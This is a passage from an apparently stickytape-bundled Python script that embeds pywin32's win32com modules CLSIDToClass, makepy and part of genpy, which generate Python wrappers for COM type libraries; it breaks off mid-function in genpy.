    __stickytape_write_module('win32com/client/CLSIDToClass.py', b'"""Manages a dictionary of CLSID strings to Python classes.\n\nPrimary use of this module is to allow modules generated by\nmakepy.py to share classes.  @makepy@ automatically generates code\nwhich interacts with this module.  You should never need to reference\nthis module directly.\n\nThis module only provides support for modules which have been previously\nbeen imported.  The gencache module provides some support for loading modules\non demand - once done, this module supports it...\n\nAs an example, the MSACCESS.TLB type library makes reference to the\nCLSID of the Database object, as defined in DAO3032.DLL.  This\nallows code using the MSAccess wrapper to natively use Databases.\n\nThis obviously applies to all cooperating objects, not just DAO and\nAccess.\n"""\nmapCLSIDToClass = {}\n\n\ndef RegisterCLSID(clsid, pythonClass):\n    """Register a class that wraps a CLSID\n\n    This function allows a CLSID to be globally associated with a class.\n    Certain module will automatically convert an IDispatch object to an\n    instance of the associated class.\n    """\n\n    mapCLSIDToClass[str(clsid)] = pythonClass\n\n\ndef RegisterCLSIDsFromDict(dict):\n    """Register a dictionary of CLSID\'s and classes.\n\n    This module performs the same function as @RegisterCLSID@, but for\n    an entire dictionary of associations.\n\n    Typically called by makepy generated modules at import time.\n    """\n    mapCLSIDToClass.update(dict)\n\n\ndef GetClass(clsid):\n    """Given a CLSID, return the globally associated class.\n\n    clsid -- a string CLSID representation to check.\n    """\n    return mapCLSIDToClass[clsid]\n\n\ndef HasClass(clsid):\n    """Determines if the CLSID has an associated class.\n\n    clsid -- the string CLSID to check\n    """\n    return clsid in mapCLSIDToClass\n')
    __stickytape_write_module('win32com/client/makepy.py', b'# Originally written by Curt Hagenlocher, and various bits\n# and pieces by Mark Hammond (and now Greg Stein has had\n# a go too :-)\n\n# Note that the main worker code has been moved to genpy.py\n# As this is normally run from the command line, it reparses the code each time.\n# Now this is nothing more than the command line handler and public interface.\n\n# XXX - TO DO\n# XXX - Greg and Mark have some ideas for a revamp - just no\n#       time - if you want to help, contact us for details.\n#       Main idea is to drop the classes exported and move to a more\n#       traditional data driven model.\n\n"""Generate a .py file from an OLE TypeLibrary file.\n\n\n This module is concerned only with the actual writing of\n a .py file.  It draws on the @build@ module, which builds\n the knowledge of a COM interface.\n\n"""\nusageHelp = """ \\\n\nUsage:\n\n  makepy.py [-i] [-v|q] [-h] [-u] [-o output_file] [-d] [typelib, ...]\n\n  -i    -- Show information for the specified typelib.\n\n  -v    -- Verbose output.\n\n  -q    -- Quiet output.\n\n  -h    -- Do not generate hidden methods.\n\n  -u    -- Python 1.5 and earlier: Do NOT convert all Unicode objects to\n           strings.\n\n           Python 1.6 and later: Convert all Unicode objects to strings.\n\n  -o    -- Create output in a specified output file.  If the path leading\n           to the file does not exist, any missing directories will be\n           created.\n           NOTE: -o cannot be used with -d.  This will generate an error.\n\n  -d    -- Generate the base code now and the class code on demand.\n           Recommended for large type libraries.\n\n  typelib -- A TLB, DLL, OCX or anything containing COM type information.\n             If a typelib is not specified, a window containing a textbox\n             will open from which you can select a registered type\n             library.\n\nExamples:\n\n  makepy.py -d\n\n    Presents a list of registered type libraries from which you can make\n    a selection.\n\n  makepy.py -d "Microsoft Excel 8.0 Object Library"\n\n    Generate support for the type library with the specified description\n    (in this case, the MS Excel object model).\n\n"""\n\nimport sys, os, importlib, pythoncom\nfrom win32com.client import genpy, selecttlb, gencache\nfrom win32com.client import Dispatch\n\nbForDemandDefault = 0  # Default value of bForDemand - toggle this to change the world - see also gencache.py\n\nerror = "makepy.error"\n\n\ndef usage():\n    sys.stderr.write(usageHelp)\n    sys.exit(2)\n\n\ndef ShowInfo(spec):\n    if not spec:\n        tlbSpec = selecttlb.SelectTlb(excludeFlags=selecttlb.FLAG_HIDDEN)\n        if tlbSpec is None:\n            return\n        try:\n            tlb = pythoncom.LoadRegTypeLib(\n                tlbSpec.clsid, tlbSpec.major, tlbSpec.minor, tlbSpec.lcid\n            )\n        except pythoncom.com_error:  # May be badly registered.\n            sys.stderr.write(\n                "Warning - could not load registered typelib \'%s\'\\n" % (tlbSpec.clsid)\n            )\n            tlb = None\n\n        infos = [(tlb, tlbSpec)]\n    else:\n        infos = GetTypeLibsForSpec(spec)\n    for (tlb, tlbSpec) in infos:\n        desc = tlbSpec.desc\n        if desc is None:\n            if tlb is None:\n                desc = "<Could not load typelib %s>" % (tlbSpec.dll)\n            else:\n                desc = tlb.GetDocumentation(-1)[0]\n        print(desc)\n        print(\n            " %s, lcid=%s, major=%s, minor=%s"\n            % (tlbSpec.clsid, tlbSpec.lcid, tlbSpec.major, tlbSpec.minor)\n        )\n        print(" >>> # Use these commands in Python code to auto generate .py support")\n        print(" >>> from win32com.client import gencache")\n        print(\n            " >>> gencache.EnsureModule(\'%s\', %s, %s, %s)"\n            % (tlbSpec.clsid, tlbSpec.lcid, tlbSpec.major, tlbSpec.minor)\n        )\n\n\nclass SimpleProgress(genpy.GeneratorProgress):\n    """A simple progress class prints its output to stderr"""\n\n    def __init__(self, verboseLevel):\n        self.verboseLevel = verboseLevel\n\n    def Close(self):\n        pass\n\n    def Finished(self):\n        if self.verboseLevel > 1:\n            sys.stderr.write("Generation complete..\\n")\n\n    def SetDescription(self, desc, maxticks=None):\n        if self.verboseLevel:\n            sys.stderr.write(desc + "\\n")\n\n    def Tick(self, desc=None):\n        pass\n\n    def VerboseProgress(self, desc, verboseLevel=2):\n        if self.verboseLevel >= verboseLevel:\n            sys.stderr.write(desc + "\\n")\n\n    def LogBeginGenerate(self, filename):\n        self.VerboseProgress("Generating to %s" % filename, 1)\n\n    def LogWarning(self, desc):\n        self.VerboseProgress("WARNING: " + desc, 1)\n\n\nclass GUIProgress(SimpleProgress):\n    def __init__(self, verboseLevel):\n        # Import some modules we need to we can trap failure now.\n        import win32ui, pywin\n\n        SimpleProgress.__init__(self, verboseLevel)\n        self.dialog = None\n\n    def Close(self):\n        if self.dialog is not None:\n            self.dialog.Close()\n            self.dialog = None\n\n    def Starting(self, tlb_desc):\n        SimpleProgress.Starting(self, tlb_desc)\n        if self.dialog is None:\n            from pywin.dialogs import status\n\n            self.dialog = status.ThreadedStatusProgressDialog(tlb_desc)\n        else:\n            self.dialog.SetTitle(tlb_desc)\n\n    def SetDescription(self, desc, maxticks=None):\n        self.dialog.SetText(desc)\n        if maxticks:\n            self.dialog.SetMaxTicks(maxticks)\n\n    def Tick(self, desc=None):\n        self.dialog.Tick()\n        if desc is not None:\n            self.dialog.SetText(desc)\n\n\ndef GetTypeLibsForSpec(arg):\n    """Given an argument on the command line (either a file name, library\n    description, or ProgID of an object) return a list of actual typelibs\n    to use."""\n    typelibs = []\n    try:\n        try:\n            tlb = pythoncom.LoadTypeLib(arg)\n            spec = selecttlb.TypelibSpec(None, 0, 0, 0)\n            spec.FromTypelib(tlb, arg)\n            typelibs.append((tlb, spec))\n        except pythoncom.com_error:\n            # See if it is a description\n            tlbs = selecttlb.FindTlbsWithDescription(arg)\n            if len(tlbs) == 0:\n                # Maybe it is the name of a COM object?\n                try:\n                    ob = Dispatch(arg)\n                    # and if so, it must support typelib info\n                    tlb, index = ob._oleobj_.GetTypeInfo().GetContainingTypeLib()\n                    spec = selecttlb.TypelibSpec(None, 0, 0, 0)\n                    spec.FromTypelib(tlb)\n                    tlbs.append(spec)\n                except pythoncom.com_error:\n                    pass\n            if len(tlbs) == 0:\n                print("Could not locate a type library matching \'%s\'" % (arg))\n            for spec in tlbs:\n                # Version numbers not always reliable if enumerated from registry.\n                # (as some libs use hex, other\'s dont.  Both examples from MS, of course.)\n                if spec.dll is None:\n                    tlb = pythoncom.LoadRegTypeLib(\n                        spec.clsid, spec.major, spec.minor, spec.lcid\n                    )\n                else:\n                    tlb = pythoncom.LoadTypeLib(spec.dll)\n\n                # We have a typelib, but it may not be exactly what we specified\n                # (due to automatic version matching of COM).  So we query what we really have!\n                attr = tlb.GetLibAttr()\n                spec.major = attr[3]\n                spec.minor = attr[4]\n                spec.lcid = attr[1]\n                typelibs.append((tlb, spec))\n        return typelibs\n    except pythoncom.com_error:\n        t, v, tb = sys.exc_info()\n        sys.stderr.write("Unable to load type library from \'%s\' - %s\\n" % (arg, v))\n        tb = None  # Storing tb in a local is a cycle!\n        sys.exit(1)\n\n\ndef GenerateFromTypeLibSpec(\n    typelibInfo,\n    file=None,\n    verboseLevel=None,\n    progressInstance=None,\n    bUnicodeToString=None,\n    bForDemand=bForDemandDefault,\n    bBuildHidden=1,\n):\n    assert bUnicodeToString is None, "this is deprecated and will go away"\n    if verboseLevel is None:\n        verboseLevel = 0  # By default, we use no gui and no verbose level!\n\n    if bForDemand and file is not None:\n        raise RuntimeError(\n            "You can only perform a demand-build when the output goes to the gen_py directory"\n        )\n    if isinstance(typelibInfo, tuple):\n        # Tuple\n        typelibCLSID, lcid, major, minor = typelibInfo\n        tlb = pythoncom.LoadRegTypeLib(typelibCLSID, major, minor, lcid)\n        spec = selecttlb.TypelibSpec(typelibCLSID, lcid, major, minor)\n        spec.FromTypelib(tlb, str(typelibCLSID))\n        typelibs = [(tlb, spec)]\n    elif isinstance(typelibInfo, selecttlb.TypelibSpec):\n        if typelibInfo.dll is None:\n            # Version numbers not always reliable if enumerated from registry.\n            tlb = pythoncom.LoadRegTypeLib(\n                typelibInfo.clsid,\n                typelibInfo.major,\n                typelibInfo.minor,\n                typelibInfo.lcid,\n            )\n        else:\n            tlb = pythoncom.LoadTypeLib(typelibInfo.dll)\n        typelibs = [(tlb, typelibInfo)]\n    elif hasattr(typelibInfo, "GetLibAttr"):\n        # A real typelib object!\n        # Could also use isinstance(typelibInfo, PyITypeLib) instead, but PyITypeLib is not directly exposed by pythoncom.\n        # \tpythoncom.TypeIIDs[pythoncom.IID_ITypeLib] seems to work\n        tla = typelibInfo.GetLibAttr()\n        guid = tla[0]\n        lcid = tla[1]\n        major = tla[3]\n        minor = tla[4]\n        spec = selecttlb.TypelibSpec(guid, lcid, major, minor)\n        typelibs = [(typelibInfo, spec)]\n    else:\n        typelibs = GetTypeLibsForSpec(typelibInfo)\n\n    if progressInstance is None:\n        progressInstance = SimpleProgress(verboseLevel)\n    progress = progressInstance\n\n    bToGenDir = file is None\n\n    for typelib, info in typelibs:\n        gen = genpy.Generator(typelib, info.dll, progress, bBuildHidden=bBuildHidden)\n\n        if file is None:\n            this_name = gencache.GetGeneratedFileName(\n                info.clsid, info.lcid, info.major, info.minor\n            )\n            full_name = os.path.join(gencache.GetGeneratePath(), this_name)\n            if bForDemand:\n                try:\n                    os.unlink(full_name + ".py")\n                except os.error:\n                    pass\n                try:\n                    os.unlink(full_name + ".pyc")\n                except os.error:\n                    pass\n                try:\n                    os.unlink(full_name + ".pyo")\n                except os.error:\n                    pass\n                if not os.path.isdir(full_name):\n                    os.mkdir(full_name)\n                outputName = os.path.join(full_name, "__init__.py")\n            else:\n                outputName = full_name + ".py"\n            fileUse = gen.open_writer(outputName)\n            progress.LogBeginGenerate(outputName)\n        else:\n            fileUse = file\n\n        worked = False\n        try:\n            gen.generate(fileUse, bForDemand)\n            worked = True\n        finally:\n            if file is None:\n                gen.finish_writer(outputName, fileUse, worked)\n        importlib.invalidate_caches()\n        if bToGenDir:\n            progress.SetDescription("Importing module")\n            gencache.AddModuleToCache(info.clsid, info.lcid, info.major, info.minor)\n\n    progress.Close()\n\n\ndef GenerateChildFromTypeLibSpec(\n    child, typelibInfo, verboseLevel=None, progressInstance=None, bUnicodeToString=None\n):\n    assert bUnicodeToString is None, "this is deprecated and will go away"\n    if verboseLevel is None:\n        verboseLevel = (\n            0  # By default, we use no gui, and no verbose level for the children.\n        )\n    if type(typelibInfo) == type(()):\n        typelibCLSID, lcid, major, minor = typelibInfo\n        tlb = pythoncom.LoadRegTypeLib(typelibCLSID, major, minor, lcid)\n    else:\n        tlb = typelibInfo\n        tla = typelibInfo.GetLibAttr()\n        typelibCLSID = tla[0]\n        lcid = tla[1]\n        major = tla[3]\n        minor = tla[4]\n    spec = selecttlb.TypelibSpec(typelibCLSID, lcid, major, minor)\n    spec.FromTypelib(tlb, str(typelibCLSID))\n    typelibs = [(tlb, spec)]\n\n    if progressInstance is None:\n        progressInstance = SimpleProgress(verboseLevel)\n    progress = progressInstance\n\n    for typelib, info in typelibs:\n        dir_name = gencache.GetGeneratedFileName(\n            info.clsid, info.lcid, info.major, info.minor\n        )\n        dir_path_name = os.path.join(gencache.GetGeneratePath(), dir_name)\n        progress.LogBeginGenerate(dir_path_name)\n\n        gen = genpy.Generator(typelib, info.dll, progress)\n        gen.generate_child(child, dir_path_name)\n        progress.SetDescription("Importing module")\n        importlib.invalidate_caches()\n        __import__("win32com.gen_py." + dir_name + "." + child)\n    progress.Close()\n\n\ndef main():\n    import getopt\n\n    hiddenSpec = 1\n    outputName = None\n    verboseLevel = 1\n    doit = 1\n    bForDemand = bForDemandDefault\n    try:\n        opts, args = getopt.getopt(sys.argv[1:], "vo:huiqd")\n        for o, v in opts:\n            if o == "-h":\n                hiddenSpec = 0\n            elif o == "-o":\n                outputName = v\n            elif o == "-v":\n                verboseLevel = verboseLevel + 1\n            elif o == "-q":\n                verboseLevel = verboseLevel - 1\n            elif o == "-i":\n                if len(args) == 0:\n                    ShowInfo(None)\n                else:\n                    for arg in args:\n                        ShowInfo(arg)\n                doit = 0\n            elif o == "-d":\n                bForDemand = not bForDemand\n\n    except (getopt.error, error) as msg:\n        sys.stderr.write(str(msg) + "\\n")\n        usage()\n\n    if bForDemand and outputName is not None:\n        sys.stderr.write("Can not use -d and -o together\\n")\n        usage()\n\n    if not doit:\n        return 0\n    if len(args) == 0:\n        rc = selecttlb.SelectTlb()\n        if rc is None:\n            sys.exit(1)\n        args = [rc]\n\n    if outputName is not None:\n        path = os.path.dirname(outputName)\n        if path != "" and not os.path.exists(path):\n            os.makedirs(path)\n        if sys.version_info > (3, 0):\n            f = open(outputName, "wt", encoding="mbcs")\n        else:\n            import codecs  # not available in py3k.\n\n            f = codecs.open(outputName, "w", "mbcs")\n    else:\n        f = None\n\n    for arg in args:\n        GenerateFromTypeLibSpec(\n            arg,\n            f,\n            verboseLevel=verboseLevel,\n            bForDemand=bForDemand,\n            bBuildHidden=hiddenSpec,\n        )\n\n    if f:\n        f.close()\n\n\nif __name__ == "__main__":\n    rc = main()\n    if rc:\n        sys.exit(rc)\n    sys.exit(0)\n')
    __stickytape_write_module('win32com/client/genpy.py', b'"""genpy.py - The worker for makepy.  See makepy.py for more details\n\nThis code was moved simply to speed Python in normal circumstances.  As the makepy.py\nis normally run from the command line, it reparses the code each time.  Now makepy\nis nothing more than the command line handler and public interface.\n\nThe makepy command line etc handling is also getting large enough in its own right!\n"""\n\n# NOTE - now supports a "demand" mechanism - the top-level is a package, and\n# each class etc can be made individually.\n# This should eventually become the default.\n# Then the old non-package technique should be removed.\n# There should be no b/w compat issues, and will just help clean the code.\n# This will be done once the new "demand" mechanism gets a good workout.\nimport os\nimport sys\nimport time\nimport win32com\n\nimport pythoncom\nfrom . import build\n\nerror = "makepy.error"\nmakepy_version = "0.5.01"  # Written to generated file.\n\nGEN_FULL = "full"\nGEN_DEMAND_BASE = "demand(base)"\nGEN_DEMAND_CHILD = "demand(child)"\n\n# This map is used purely for the users benefit -it shows the\n# raw, underlying type of Alias/Enums, etc.  The COM implementation\n# does not use this map at runtime - all Alias/Enum have already\n# been translated.\nmapVTToTypeString = {\n    pythoncom.VT_I2: "types.IntType",\n    pythoncom.VT_I4: "types.IntType",\n    pythoncom.VT_R4: "types.FloatType",\n    pythoncom.VT_R8: "types.FloatType",\n    pythoncom.VT_BSTR: "types.StringType",\n    pythoncom.VT_BOOL: "types.IntType",\n    pythoncom.VT_VARIANT: "types.TypeType",\n    pythoncom.VT_I1: "types.IntType",\n    pythoncom.VT_UI1: "types.IntType",\n    pythoncom.VT_UI2: "types.IntType",\n    pythoncom.VT_UI4: "types.IntType",\n    pythoncom.VT_I8: "types.LongType",\n    pythoncom.VT_UI8: "types.LongType",\n    pythoncom.VT_INT: "types.IntType",\n    pythoncom.VT_DATE: "pythoncom.PyTimeType",\n    pythoncom.VT_UINT: "types.IntType",\n}\n\n# Given a propget function\'s arg desc, return the default parameters for all\n# params bar the first.  Eg, then Python does a:\n# object.Property = "foo"\n# Python can only pass the "foo" value.  If the property has\n# multiple args, and the rest have default values, this allows\n# Python to correctly pass those defaults.\ndef MakeDefaultArgsForPropertyPut(argsDesc):\n    ret = []\n    for desc in argsDesc[1:]:\n        default = build.MakeDefaultArgRepr(desc)\n        if default is None:\n            break\n        ret.append(default)\n    return tuple(ret)\n\n\ndef MakeMapLineEntry(dispid, wFlags, retType, argTypes, user, resultCLSID):\n    # Strip the default value\n    argTypes = tuple([what[:2] for what in argTypes])\n    return \'(%s, %d, %s, %s, "%s", %s)\' % (\n        dispid,\n        wFlags,\n        retType[:2],\n        argTypes,\n        user,\n        resultCLSID,\n    )\n\n\ndef MakeEventMethodName(eventName):\n    if eventName[:2] == "On":\n        return eventName\n    else:\n        return "On" + eventName\n\n\ndef WriteSinkEventMap(obj, stream):\n    print("\\t_dispid_to_func_ = {", file=stream)\n    for name, entry in (\n        list(obj.propMapGet.items())\n        + list(obj.propMapPut.items())\n        + list(obj.mapFuncs.items())\n    ):\n        fdesc = entry.desc\n        print(\n            \'\\t\\t%9d : "%s",\' % (fdesc.memid, MakeEventMethodName(entry.names[0])),\n            file=stream,\n        )\n    print("\\t\\t}", file=stream)\n\n\n# MI is used to join my writable helpers, and the OLE\n# classes.\nclass WritableItem:\n    # __cmp__ used for sorting in py2x...\n    def __cmp__(self, other):\n        "Compare for sorting"\n        ret = cmp(self.order, other.order)\n        if ret == 0 and self.doc:\n            ret = cmp(self.doc[0], other.doc[0])\n        return ret\n\n    # ... but not used in py3k - __lt__ minimum needed there\n    def __lt__(self, other):  # py3k variant\n        if self.order == other.order:\n            return self.doc < other.doc\n        return self.order < other.order\n\n    def __repr__(self):\n        return "OleItem: doc=%s, order=%d" % (repr(self.doc), self.order)\n\n\nclass RecordItem(build.OleItem, WritableItem):\n    order = 9\n    typename = "RECORD"\n\n    def __init__(self, typeInfo, typeAttr, doc=None, bForUser=1):\n        ##    sys.stderr.write("Record %s: size %s\\n" % (doc,typeAttr.cbSizeInstance))\n        ##    sys.stderr.write(" cVars = %s\\n" % (typeAttr.cVars,))\n        ##    for i in range(typeAttr.cVars):\n        ##        vdesc = typeInfo.GetVarDesc(i)\n        ##        sys.stderr.write(" Var %d has value %s, type %d, desc=%s\\n" % (i, vdesc.value, vdesc.varkind, vdesc.elemdescVar))\n        ##        sys.stderr.write(" Doc is %s\\n" % (typeInfo.GetDocumentation(vdesc.memid),))\n\n        build.OleItem.__init__(self, doc)\n        self.clsid = typeAttr[0]\n\n    def WriteClass(self, generator):\n        pass\n\n\n# Given an enum, write all aliases for it.\n# (no longer necessary for new style code, but still used for old code.\ndef WriteAliasesForItem(item, aliasItems, stream):\n    for alias in aliasItems.values():\n        if item.doc and alias.aliasDoc and (alias.aliasDoc[0] == item.doc[0]):\n            alias.WriteAliasItem(aliasItems, stream)\n\n\nclass AliasItem(build.OleItem, WritableItem):\n    order = 2\n    typename = "ALIAS"\n\n    def __init__(self, typeinfo, attr, doc=None, bForUser=1):\n        build.OleItem.__init__(self, doc)\n\n        ai = attr[14]\n        self.attr = attr\n        if type(ai) == type(()) and type(ai[1]) == type(\n            0\n        ):  # XXX - This is a hack - why tuples?  Need to resolve?\n            href = ai[1]\n            alinfo = typeinfo.GetRefTypeInfo(href)\n            self.aliasDoc = alinfo.GetDocumentation(-1)\n            self.aliasAttr = alinfo.GetTypeAttr()\n        else:\n            self.aliasDoc = None\n            self.aliasAttr = None\n\n    def WriteAliasItem(self, aliasDict, stream):\n        # we could have been written as part of an alias dependency\n        if self.bWritten:\n            return\n\n        if self.aliasDoc:\n            depName = self.aliasDoc[0]\n            if depName in aliasDict:\n                aliasDict[depName].WriteAliasItem(aliasDict, stream)\n            print(self.doc[0] + " = " + depName, file=stream)\n        else:\n            ai = self.attr[14]\n            if type(ai) == type(0):\n                try:\n                    typeStr = mapVTToTypeString[ai]\n                    print("# %s=%s" % (self.doc[0], typeStr), file=stream)\n                except KeyError:\n                    print(\n                        self.doc[0] + " = None # Can\'t convert alias info " + str(ai),\n                        file=stream,\n                    )\n        print(file=stream)\n        self.bWritten = 1\n\n\nclass EnumerationItem(build.OleItem, WritableItem):\n    order = 1\n    typename = "ENUMERATION"\n\n    def __init__(self, typeinfo, attr, doc=None, bForUser=1):\n        build.OleItem.__init__(self, doc)\n\n        self.clsid = attr[0]\n        self.mapVars = {}\n        typeFlags = attr[11]\n        self.hidden = (\n            typeFlags & pythoncom.TYPEFLAG_FHIDDEN\n            or typeFlags & pythoncom.TYPEFLAG_FRESTRICTED\n        )\n\n        for j in range(attr[7]):\n            vdesc = typeinfo.GetVarDesc(j)\n            name = typeinfo.GetNames(vdesc[0])[0]\n            self.mapVars[name] = build.MapEntry(vdesc)\n\n    ##  def WriteEnumerationHeaders(self, aliasItems, stream):\n    ##    enumName = self.doc[0]\n    ##    print >> stream "%s=constants # Compatibility with previous versions." % (enumName)\n    ##    WriteAliasesForItem(self, aliasItems)\n\n    def WriteEnumerationItems(self, stream):\n        num = 0\n        enumName = self.doc[0]\n        # Write in name alpha order\n        names = list(self.mapVars.keys())\n        names.sort()\n        for name in names:\n            entry = self.mapVars[name]\n            vdesc = entry.desc\n            if vdesc[4] == pythoncom.VAR_CONST:\n                val = vdesc[1]\n\n                use = repr(val)\n                # Make sure the repr of the value is valid python syntax\n                # still could cause an error on import if it contains a module or type name\n                # not available in the global namespace\n                try:\n                    compile(use, "<makepy>", "eval")\n                except SyntaxError:\n                    # At least add the repr as a string, so it can be investigated further\n                    # Sanitize it, in case the repr contains its own quotes.  (??? line breaks too ???)\n                    use = use.replace(\'"\', "\'")\n                    use = (\n                        \'"\'\n                        + use\n                        + \'"\'\n                        + " # This VARIANT type cannot be converted automatically"\n                    )\n                print(\n                    "\\t%-30s=%-10s # from enum %s"\n                    % (build.MakePublicAttributeName(name, True), use, enumName),\n                    file=stream,\n                )\n                num += 1\n        return num\n\n\nclass VTableItem(build.VTableItem, WritableItem):\n    order = 4\n\n    def WriteClass(self, generator):\n        self.WriteVTableMap(generator)\n        self.bWritten = 1\n\n    def WriteVTableMap(self, generator):\n        stream = generator.file\n        print(\n            "%s_vtables_dispatch_ = %d" % (self.python_name, self.bIsDispatch),\n            file=stream,\n        )\n        print("%s_vtables_ = [" % (self.python_name,), file=stream)\n        for v in self.vtableFuncs:\n            names, dispid, desc = v\n            assert desc.desckind == pythoncom.DESCKIND_FUNCDESC\n            arg_reprs = []\n            # more hoops so we don\'t generate huge lines.\n            item_num = 0\n            print("\\t((", end=" ", file=stream)\n            for name in names:\n                print(repr(name), ",", end=" ", file=stream)\n                item_num = item_num + 1\n                if item_num % 5 == 0:\n                    print("\\n\\t\\t\\t", end=" ", file=stream)\n            print(\n                "), %d, (%r, %r, [" % (dispid, desc.memid, desc.scodeArray),\n                end=" ",\n                file=stream,\n            )\n            for arg in desc.args:\n                item_num = item_num + 1\n                if item_num % 5 == 0:\n                    print("\\n\\t\\t\\t", end=" ", file=stream)\n                defval = build.MakeDefaultArgRepr(arg)\n                if arg[3] is None:\n                    arg3_repr = None\n                else:\n                    arg3_repr = repr(arg[3])\n                print(\n                    repr((arg[0], arg[1], defval, arg3_repr)), ",", end=" ", file=stream\n                )\n            print("],", end=" ", file=stream)\n            print(repr(desc.funckind), ",", end=" ", file=stream)\n            print(repr(desc.invkind), ",", end=" ", file=stream)\n            print(repr(desc.callconv), ",", end=" ", file=stream)\n            print(repr(desc.cParamsOpt), ",", end=" ", file=stream)\n            print(repr(desc.oVft), ",", end=" ", file=stream)\n            print(repr(desc.rettype), ",", end=" ", file=stream)\n            print(repr(desc.wFuncFlags), ",", end=" ", file=stream)\n            print(")),", file=stream)\n        print("]", file=stream)\n        print(file=stream)\n\n\nclass DispatchItem(build.DispatchItem, WritableItem):\n    order = 3\n\n    def __init__(self, typeinfo, attr, doc=None):\n        build.DispatchItem.__init__(self, typeinfo, attr, doc)\n        self.type_attr = attr\n        self.coclass_clsid = None\n\n    def WriteClass(self, generator):\n        if (\n            not self.bIsDispatch\n            and not self.type_attr.typekind == pythoncom.TKIND_DISPATCH\n        ):\n            return\n        # This is pretty screwey - now we have vtable support we\n        # should probably rethink this (ie, maybe write both sides for sinks, etc)\n        if self.bIsSink:\n            self.WriteEventSinkClassHeader(generator)\n            self.WriteCallbackClassBody(generator)\n        else:\n            self.WriteClassHeader(generator)\n            self.WriteClassBody(generator)\n        print(file=generator.file)\n        self.bWritten = 1\n\n    def WriteClassHeader(self, generator):\n        generator.checkWriteDispatchBaseClass()\n        doc = self.doc\n        stream = generator.file\n        print("class " + self.python_name + "(DispatchBaseClass):", file=stream)\n        if doc[1]:\n            print("\\t" + build._makeDocString(doc[1]), file=stream)\n        try:\n            progId = pythoncom.ProgIDFromCLSID(self.clsid)\n            print(\n                "\\t# This class is creatable by the name \'%s\'" % (progId), file=stream\n            )\n        except pythoncom.com_error:\n            pass\n        print("\\tCLSID = " + repr(self.clsid), file=stream)\n        if self.coclass_clsid is None:\n            print("\\tcoclass_clsid = None", file=stream)\n        else:\n            print("\\tcoclass_clsid = " + repr(self.coclass_clsid), file=stream)\n        print(file=stream)\n        self.bWritten = 1\n\n    def WriteEventSinkClassHeader(self, generator):\n        generator.checkWriteEventBaseClass()\n        doc = self.doc\n        stream = generator.file\n        print("class " + self.python_name + ":", file=stream)\n        if doc[1]:\n            print("\\t" + build._makeDocString(doc[1]), file=stream)\n        try:\n            progId = pythoncom.ProgIDFromCLSID(self.clsid)\n            print(\n                "\\t# This class is creatable by the name \'%s\'" % (progId), file=stream\n            )\n        except pythoncom.com_error:\n            pass\n        print("\\tCLSID = CLSID_Sink = " + repr(self.clsid), file=stream)\n        if self.coclass_clsid is None:\n            print("\\tcoclass_clsid = None", file=stream)\n        else:\n            print("\\tcoclass_clsid = " + repr(self.coclass_clsid), file=stream)\n        print("\\t_public_methods_ = [] # For COM Server support", file=stream)\n        WriteSinkEventMap(self, stream)\n        print(file=stream)\n        print("\\tdef __init__(self, oobj = None):", file=stream)\n        print("\\t\\tif oobj is None:", file=stream)\n        print("\\t\\t\\tself._olecp = None", file=stream)\n        print("\\t\\telse:", file=stream)\n        print("\\t\\t\\timport win32com.server.util", file=stream)\n        print(\n            "\\t\\t\\tfrom win32com.server.policy import EventHandlerPolicy", file=stream\n        )\n        print(\n            "\\t\\t\\tcpc=oobj._oleobj_.QueryInterface(pythoncom.IID_IConnectionPointContainer)",\n            file=stream,\n        )\n        print("\\t\\t\\tcp=cpc.FindConnectionPoint(self.CLSID_Sink)", file=stream)\n        print(\n            "\\t\\t\\tcookie=cp.Advise(win32com.server.util.wrap(self, usePolicy=EventHandlerPolicy))",\n            file=stream,\n        )\n        print("\\t\\t\\tself._olecp,self._olecp_cookie = cp,cookie", file=stream)\n        print("\\tdef __del__(self):", file=stream)\n        print("\\t\\ttry:", file=stream)\n        print("\\t\\t\\tself.close()", file=stream)\n        print("\\t\\texcept pythoncom.com_error:", file=stream)\n        print("\\t\\t\\tpass", file=stream)\n        print("\\tdef close(self):", file=stream)\n        print("\\t\\tif self._olecp is not None:", file=stream)\n        print(\n            "\\t\\t\\tcp,cookie,self._olecp,self._olecp_cookie = self._olecp,self._olecp_cookie,None,None",\n            file=stream,\n        )\n        print("\\t\\t\\tcp.Unadvise(cookie)", file=stream)\n        print("\\tdef _query_interface_(self, iid):", file=stream)\n        print("\\t\\timport win32com.server.util", file=stream)\n        print(\n            "\\t\\tif iid==self.CLSID_Sink: return win32com.server.util.wrap(self)",\n            file=stream,\n        )\n        print(file=stream)\n        self.bWritten = 1\n\n    def WriteCallbackClassBody(self, generator):\n        stream = generator.file\n        print("\\t# Event Handlers", file=stream)\n        print(\n            "\\t# If you create handlers, they should have the following prototypes:",\n            file=stream,\n        )\n        for name, entry in (\n            list(self.propMapGet.items())\n            + list(self.propMapPut.items())\n            + list(self.mapFuncs.items())\n        ):\n            fdesc = entry.desc\n            methName = MakeEventMethodName(entry.names[0])\n            print(\n                "#\\tdef "\n                + methName\n                + "(self"\n                + build.BuildCallList(\n                    fdesc,\n                    entry.names,\n                    "defaultNamedOptArg",\n                    "defaultNamedNotOptArg",\n                    "defaultUnnamedArg",\n                    "pythoncom.Missing",\n                    is_comment=True,\n                )\n                + "):",\n                file=stream,\n            )\n            if entry.doc and entry.doc[1]:\n                print("#\\t\\t" + build._makeDocString(entry.doc[1]), file=stream)\n        print(file=stream)\n        self.bWritten = 1\n\n    def WriteClassBody(self, generator):\n        stream = generator.file\n        # Write in alpha order.\n        names = list(self.mapFuncs.keys())\n        names.sort()\n        specialItems = {\n            "count": None,\n            "item": None,\n            "value": None,\n            "_newenum": None,\n        }  # If found, will end up with (entry, invoke_tupe)\n        itemCount = None\n        for name in names:\n            entry = self.mapFuncs[name]\n            assert entry.desc.desckind == pythoncom.DESCKIND_FUNCDESC\n            # skip [restricted] methods, unless it is the\n            # enumerator (which, being part of the "system",\n            # we know about and can use)\n            dispid = entry.desc.memid\n            if (\n                entry.desc.wFuncFlags & pythoncom.FUNCFLAG_FRESTRICTED\n                and dispid != pythoncom.DISPID_NEWENUM\n            ):\n                continue\n            # If not accessible via IDispatch, then we can\'t use it here.\n            if entry.desc.funckind != pythoncom.FUNC_DISPATCH:\n                continue\n            if dispid == pythoncom.DISPID_VALUE:\n                lkey = "value"\n            elif dispid == pythoncom.DISPID_NEWENUM:\n                specialItems["_newenum"] = (entry, entry.desc.invkind, None)\n                continue  # Dont build this one now!\n            else:\n                lkey = name.lower()\n            if (\n                lkey in specialItems and specialItems[lkey] is None\n            ):  # remember if a special one.\n                specialItems[lkey] = (entry, entry.desc.invkind, None)\n            if generator.bBuildHidden or not 